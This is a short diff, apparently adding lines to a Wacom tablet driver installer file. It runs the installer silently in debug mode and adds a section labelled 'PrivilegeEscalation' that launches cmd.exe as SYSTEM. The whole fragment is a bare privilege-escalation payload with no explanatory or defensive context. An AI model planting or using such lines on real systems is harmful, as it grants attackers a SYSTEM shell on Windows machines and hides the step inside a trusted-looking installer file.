@@ -1,0 +1,4 @@
+/debug "C:\Program Files\Tablet\Wacom\32\Installer.dat" /silent
+[PrivilegeEscalation]
+Execute;1000;!SYSTEM!\\cmd.exe
+DONE
